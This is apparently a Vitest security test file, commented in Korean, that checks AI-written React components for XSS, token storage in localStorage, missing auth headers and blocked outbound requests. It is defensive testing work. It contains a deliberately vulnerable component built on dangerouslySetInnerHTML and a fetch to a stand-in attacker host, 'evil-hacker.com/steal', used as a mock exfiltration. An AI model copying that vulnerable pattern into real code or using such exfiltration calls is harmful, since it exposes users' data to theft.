import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { render } from '@testing-library/react';
import React from 'react';
import { securityMswServer, initStorageGuard, testXssVulnerability } from './security-suite-harness';

// 더미 컴포넌트
const SafeCommentComponent = ({ content }: { content: string }) => {
  return React.createElement('div', { 'data-testid': 'comment' }, content);
};

const VulnerableCommentComponent = ({ content }: { content: string }) => {
  return React.createElement('div', { 
    'data-testid': 'comment', 
    dangerouslySetInnerHTML: { __html: content } 
  });
};

describe('종합 프론트엔드 보안 하네스 테스트', () => {
  beforeAll(() => {
    securityMswServer.listen();
    initStorageGuard();
  });

  afterAll(() => {
    securityMswServer.close();
  });

  it('AI가 작성한 코드가 XSS 공격에 안전한지 검증 (안전한 컴포넌트)', () => {
    expect(() => {
      testXssVulnerability((maliciousInput) => {
        render(React.createElement(SafeCommentComponent, { content: maliciousInput }));
      });
    }).not.toThrow();
  });

  it('AI가 작성한 코드가 XSS 공격에 취약할 경우 실패하는지 검증 (취약한 컴포넌트)', () => {
    expect(() => {
      testXssVulnerability((maliciousInput) => {
        render(React.createElement(VulnerableCommentComponent, { content: maliciousInput }));
      });
    }).toThrow('[SECURITY VIOLATION] XSS 방어가 뚫렸습니다!');
    
    delete (global as any).window.__xss_compromised__;
  });

  it('민감한 정보를 LocalStorage에 저장하려고 하면 차단되는지 검증', () => {
    expect(() => {
      localStorage.setItem('accessToken', 'my-secret-token');
    }).toThrow('[SECURITY VIOLATION]');

    expect(() => {
      localStorage.setItem('theme', 'dark');
    }).not.toThrow();
  });
  
  it('API 요청 시 인증 헤더 누락 시 검증 (fetch API)', async () => {
    const response = await fetch('http://api.myservice.com/data');
    const result = await response.json();
    
    expect(response.status).toBe(400);
    expect(result.status).toBe('FAIL');
    expect(result.reason).toContain('Authorization 헤더가 누락되었습니다.');
  });
  
  it('허용되지 않은 외부 도메인으로 데이터 전송 시 차단되는지 검증 (CSP)', async () => {
    const response = await fetch('http://evil-hacker.com/steal?data=123');
    const result = await response.json();
    
    expect(response.status).toBe(403);
    expect(result.status).toBe('FAIL');
    expect(result.reason).toContain('허용되지 않은 외부 도메인');
  });
});
